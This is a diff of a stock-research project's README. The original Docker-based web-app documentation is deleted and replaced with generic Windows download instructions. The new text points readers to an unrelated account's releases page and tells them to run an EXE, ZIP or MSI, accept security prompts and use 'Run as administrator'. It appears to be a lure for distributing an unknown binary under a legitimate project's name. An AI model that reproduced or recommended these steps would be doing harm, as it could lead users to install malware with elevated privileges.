@@ -1,234 +1,171 @@
-<p align="center">
-  <strong>θΣ×</strong>
-</p>
+# 📈 zero-sum-public - Stock research made simple
 
-<h1 align="center">The Zero Sum Times</h1>
+[![Download zero-sum-public](https://img.shields.io/badge/Download%20zero--sum--public-0B5FFF?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Inextinguishable-principalship955/zero-sum-public/releases)
 
-<p align="center">
-  A comprehensive, Wall Street Journal-inspired stock market analysis platform.<br/>
-  Real-time quotes, interactive charting, fundamental analysis, sector correlations, and more — all in one place.
-</p>
+## 🧭 What this app does
 
-<p align="center">
-  <a href="https://zero-sum-times.com"><img src="https://img.shields.io/badge/🌐_Live_Site-zero--sum--times.com-8B6914?style=for-the-badge" alt="Live Site" /></a>
-</p>
+zero-sum-public is a stock research and charting app for Windows. It helps you look at price charts, track market data, and review stocks in one place. Use it to scan symbols, compare price moves, and study trends before you make a decision.
 
-<p align="center">
-  <a href="https://github.com/tristcoil/zero-sum-public"><img src="https://img.shields.io/badge/GitHub-Source_Code-181717?style=for-the-badge&logo=github&logoColor=white" alt="GitHub" /></a>
-  &nbsp;
-  <a href="https://discord.gg/a89Ua6CQj"><img src="https://img.shields.io/badge/Discord-Join_Community-5865F2?style=for-the-badge&logo=discord&logoColor=white" alt="Discord" /></a>
-</p>
+This app is made for people who want a clear view of the market without setting up a complex tool.
 
-<p align="center">
-  <img src="https://img.shields.io/badge/Next.js-16-black?logo=next.js" alt="Next.js" />
-  <img src="https://img.shields.io/badge/React-19-61dafb?logo=react" alt="React" />
-  <img src="https://img.shields.io/badge/Flask-3-green?logo=flask" alt="Flask" />
-  <img src="https://img.shields.io/badge/Python-3.12-blue?logo=python" alt="Python" />
-  <img src="https://img.shields.io/badge/License-MIT-yellow" alt="MIT License" />
-</p>
+## 💻 What you need
 
----
+Before you install, check that your PC has:
 
-## Fundamental Analysis
+- Windows 10 or Windows 11
+- At least 4 GB of RAM
+- 200 MB of free disk space
+- An internet connection for updates and market data
+- A mouse and keyboard
+- A screen with at least 1366 × 768 resolution
 
-Dive deep into any stock with a full-page breakdown: price history with moving averages, company profile, cash & debt overview, balance sheet visualizations (assets vs. liabilities vs. equity), ratings snapshot radar, and cash vs. debt trends. Key metrics — market cap, P/E, P/S, beta, dividend yield, 52-week range, and average volume — are displayed at a glance.
+For smoother use, 8 GB of RAM or more is a better fit if you plan to keep many charts open.
 
-![Fundamental Analysis](img/fundamental_analysis.png)
+## 🚀 Download
 
----
+Visit the release page and download the latest Windows version from here:
 
-## Landing Page & Market Dashboard
+https://github.com/Inextinguishable-principalship955/zero-sum-public/releases
 
-The home page provides a real-time market overview: major indices (S&P 500, Dow Jones, NASDAQ, Russell 2000, VIX), crypto & commodity tickers (Bitcoin, Ethereum, Gold, Crude Oil, 10Y Treasury), a color-coded sector performance heatmap, top market movers (gainers, losers, most active), curated market news, and an upcoming earnings calendar. A scrolling ticker bar with stock & crypto quotes rounds it off, along with random finance formulas and Wall Street quotes.
+On that page, look for the newest release and download the Windows file that matches your PC. If you see a ZIP file, save it to your computer first, then open it. If you see an EXE file, you can run it after the download finishes.
 
-![Landing Page](img/landing_page.png)
+## 🛠️ Install and set up
 
----
+Follow these steps on Windows:
 
-## Advanced Charting Terminal
+1. Open the release page in your browser.
+2. Find the latest release at the top of the page.
+3. Download the Windows build.
+4. If the file is zipped, right-click it and choose Extract All.
+5. Open the extracted folder.
+6. Double-click the app file to start it.
+7. If Windows asks for permission, choose Yes.
+8. If you see a security prompt, confirm that you want to run the file.
 
-A professional-grade charting terminal with TradingView-powered interactive charts, multiple timeframes (intraday to 5Y), and extensive customization. Toggle chart types (Heikin Ashi, candlestick), overlays (Bollinger Bands, EMA, Ichimoku, VWAP, Fibonacci, SAR), structure tools (trendlines, ranges, volume profile, FVG), and studies (RSI, MACD, Stochastic, OBV, ADX/DMI, Williams %R, CCI). Includes drawing tools, chart presets (swing, trend, mean reversion), data export, replay mode, and a live watchlist sidebar with sector tabs.
+If the app opens with a blank screen on first launch, wait a moment. It may be loading market data and chart assets.
 
-![Advanced Charting](img/advanced_charting.png)
+## 📊 Main features
 
----
+zero-sum-public focuses on the tools most users need for stock research:
 
-## Technical Analysis & Setup Detection
+- Price charts with clean, easy-to-read views
+- Symbol lookup so you can find stocks fast
+- Market data display for recent price moves
+- Trend review for spotting direction changes
+- Chart time ranges for short and long views
+- A simple layout that keeps research clear
 
-Automated technical analysis with an AI-generated scoring dashboard. Provides a composite BUY/SELL score, indicator scorecard (RSI, MACD, Bollinger %B, Stochastic, EMA), key price levels (stop-loss, SAR trailing stop, SMA, Fibonacci retracements, support/resistance), and contextual commentary on trend direction, momentum, and volatility. Compare performance vs. SPY and QQQ benchmarks at a glance.
+These tools help you compare stocks and read price action without extra clutter.
 
-![Technical Analysis](img/technical_analysis.png)
+## 🖱️ How to use it
 
----
+Once the app opens, start with these steps:
 
-## Market Heatmap
+1. Search for a stock symbol, such as AAPL or TSLA.
+2. Open the chart view.
+3. Switch between time ranges to study short-term and long-term moves.
+4. Look at highs, lows, and price swings.
+5. Compare the current move with past price behavior.
+6. Use the research view to review data before you act.
 
-An interactive treemap visualization of 500+ stocks, sized by market cap and colored by daily performance. Filter by S&P 500 or NASDAQ-100, switch between time periods (1D, 1W, 1M, YTD) and chart ranges (3M–5Y), group by sector or view flat, filter by sector, and search for any ticker. Toggle between map, sector summary, and table views.
+If you track more than one stock, keep your main symbols in a small list so you can move between them with less effort.
 
-![Market Heatmap](img/market_heatmap.png)
+## 🔍 Tips for better chart reading
 
----
+A few simple habits can make the app easier to use:
 
-## Watchlist
+- Check the daily chart first
+- Use longer time ranges to see the bigger trend
+- Look for repeated support and resistance levels
+- Compare volume with price movement
+- Keep notes on symbols you watch often
 
-A personalized watchlist with grid and chart views. Each card shows a TradingView price chart with moving average overlays, a revenue & profit mini-chart (net income, margin trend, revenue bars), and a dividend history chart with yield and growth indicators. Toggle visibility layers (MA, Revenue, Dividends), switch time periods, and manage tickers. A persistent sidebar tracks real-time prices and daily changes across your full watchlist.
+If a chart looks noisy, move to a longer time range. That often makes the pattern easier to read.
 
-![Watchlist](img/watchlist_grid.png)
+## 🧩 Common uses
 
----
+People use zero-sum-public for tasks like:
 
-## Stock Comparison
+- Checking a stock before market open
+- Reviewing daily price moves
+- Watching a portfolio list
+- Comparing several tickers side by side
+- Studying breakouts and pullbacks
+- Keeping a research workflow in one app
 
-Compare any set of stocks side by side. Summary cards show price, YTD/1Y performance, 52-week range, and sector/industry. Includes a normalized price chart (rebased to 100) for direct performance comparison, a multi-period return table (1M through 5Y), a fundamentals radar chart (profit margin, operating margin, gross margin, ROE, ROA, liquidity), and a risk vs. return scatter plot (annualized volatility vs. annualized return).
+## 🪟 Windows file types
 
-![Stock Comparison](img/stock_comparison.png)
+You may see one of these file types in the release page:
 
----
+- **.exe** — run this file after download
+- **.zip** — extract the folder, then run the app file inside
+- **.msi** — open the installer and follow the prompts
 
-## Sector Analysis
+If you are not sure which file to pick, choose the Windows file with the clearest name and the latest version tag.
 
-Cross-sector correlation analysis across all 11 S&P 500 sectors. Features a color-coded correlation matrix showing how sectors move together, with cap-weighted and equal-weighted views over 3M–5Y windows. Includes normalized sector performance charts (rebased to $100) to visualize cumulative returns, helping identify diversification opportunities and hedging strategies.
+## 🔐 Safety checks
 
-![Sector Analysis](img/sector_correlation.png)
+Before you open the file, it helps to:
 
----
+- Make sure the file name matches the release you downloaded
+- Check that the download came from the release page
+- Keep the file in a folder you can find again
+- Remove older versions if you no longer use them
 
-## Sector Hexagonal Density Plot
+If Windows shows a prompt about an unknown app, verify that you downloaded it from the release page above.
 
-An interactive hexbin scatter plot showing daily return correlations between any two sectors. Pairs are categorized by correlation strength (strong positive, moderate, weak, near zero) and selected via the correlation matrix or quick-pick buttons. Displays regression line, R² value, and data point count — useful for visualizing sector co-movement patterns and tail-risk events.
+## ⚙️ If the app does not start
 
-![Correlation Density Plot](img/correlation_analysis.png)
+Try these steps if the app does not open:
 
----
+1. Right-click the app and choose Run as administrator.
+2. Check that the file finished downloading.
+3. Make sure you extracted the ZIP file if you downloaded one.
+4. Close the app and open it again.
+5. Restart your PC.
+6. Install any Windows updates that are waiting.
 
-## Congress Trading Tracker
+If the window opens but some data is missing, check your internet connection and try again.
 
-Track stock trades disclosed by U.S. Congress members under the STOCK Act. Dashboard shows total trades, unique tickers, buy/sell breakdown by party (Democrats vs. Republicans), buy/sell sentiment donut chart, and monthly trading activity. Tables highlight the most bought and most sold stocks with estimated volumes, plus best and worst performing trades ranked by excess return vs. S&P 500.
+## 📁 Suggested folder setup
 
-![Congress Trading Tracker](img/congress_trade_tracker.png)
+Keep your stock tools in one folder so they are easy to find:
 
----
+- Downloads
+  - zero-sum-public
+    - release files
+    - notes
+    - screenshots
 
-## Tech Stack
+This makes it easier to manage updates and return to the same version later.
 
-| Layer | Technology |
-|-------|-----------|
-| **Frontend** | Next.js 16, React 19, TypeScript, Tailwind CSS |
-| **Backend** | Python 3, Flask 3, pandas, NumPy, yfinance |
-| **Charts** | TradingView Lightweight Charts, Recharts, D3.js |
-| **Data** | Yahoo Finance API, batch caching, scheduled updates |
-| **Infra** | Docker, Docker Compose, Nginx reverse proxy |
+## 🧠 Best results
 
-## Quick Start (Docker)
+Use the app in a quiet research flow:
 
-Run the entire app locally with just **Git** and **Docker**. No Node.js, Python, or other dependencies needed on your machine.
+- Open one chart at a time when you are learning the layout
+- Compare a stock with its recent history
+- Check both the daily and weekly view
+- Review price action before you focus on news
+- Save your notes outside the app if you want a paper trail
 
-### 1. Clone the repo
+A small routine helps you read charts with less effort.
 
-```bash
-git clone https://github.com/tristcoil/zero-sum-public.git
-cd zero-sum-public
-```
+## 📦 Update the app
 
-### 2. Create the config file
+When a new version is available:
 
-```bash
-cp backend/.env.example backend/.env
-```
+1. Go to the release page.
+2. Download the newest Windows file.
+3. Remove the old version if you want a clean setup.
+4. Open the new file or replace the old app folder if needed.
 
-That's it — the defaults work out of the box. The app runs fully without any API keys.
+Keeping the latest release helps you stay current with fixes and chart changes.
 
-> **Optional:** If you want AI-generated stock analysis summaries, open `backend/.env` and add your [OpenAI API key](https://platform.openai.com/api-keys). Everything else (charts, market data, heatmaps, screeners, etc.) works without it.
+## 📄 License
 
-### 3. Start the app
+MIT License
 
-```bash
-docker compose up --build
-```
+## 🧷 Project name
 
-First build takes a few minutes (downloading dependencies, building images). Subsequent starts are fast.
-
-### 4. Open in your browser
-
-- **Frontend:** [http://localhost:3000](http://localhost:3000)
-- **Backend API:** [http://localhost:5000/api/health](http://localhost:5000/api/health)
-
-> **Note:** On first start, the background scheduler begins fetching market data. Give it a minute or two for the landing page, heatmap, and other sections to populate.
-
-### Stopping
-
-```bash
-# Stop all containers (data is preserved in ./data/)
-docker compose down
-```
-
-### Updating
-
-```bash
-git pull
-docker compose up --build
-```
-
----
-
-## What's Inside
-
-| Container | Description |
-|-----------|-------------|
-| **backend** | Flask API — serves market data, fundamentals, analysis |
-| **scheduler** | Background worker — fetches & caches Yahoo Finance data on a schedule |
-| **frontend** | Next.js UI — the full dashboard and charting terminal |
-
-All market data is cached in the `./data/` directory on your machine and persists across restarts.
-
----
-
-## Configuration
-
-All configuration lives in `backend/.env`. Edit it to customize:
-
-| Variable | Default | Description |
-|----------|---------|-------------|
-| `OPENAI_API_KEY` | *(empty)* | OpenAI key for AI analysis (optional) |
-| `OPENAI_ORG_ID` | *(empty)* | OpenAI org ID (optional) |
-| `ANALYSIS_MODEL` | `gpt-4o` | Which OpenAI model to use |
-| `ANALYSIS_CACHE_HOURS` | `24` | How long to cache AI analysis results |
-
-The scheduler timing and cache TTL can be tuned via `docker-compose.yml` environment variables — the defaults are sensible for local use.
-
----
-
-## Development (without Docker)
-
-If you prefer running things natively for development:
-
-```bash
-# Backend
-cd backend
-python -m venv .venv
-source .venv/bin/activate
-pip install -r requirements.txt
-cp .env.example .env
-python app.py
-
-# Frontend (in a separate terminal)
-cd frontend
-npm install
-npm run dev
-```
-
-The frontend runs on `http://localhost:3000` and the backend API on `http://localhost:5000`.
-
----
-
-## Community
-
-<p align="center">
-  <a href="https://github.com/tristcoil/zero-sum-public"><img src="https://img.shields.io/badge/GitHub-Source_Code-181717?style=for-the-badge&logo=github&logoColor=white" alt="GitHub" /></a>
-  &nbsp;
-  <a href="https://discord.gg/a89Ua6CQj"><img src="https://img.shields.io/badge/Discord-Join_Community-5865F2?style=for-the-badge&logo=discord&logoColor=white" alt="Discord" /></a>
-</p>
-
-## License
-
-[MIT](LICENSE)
+zero-sum-public
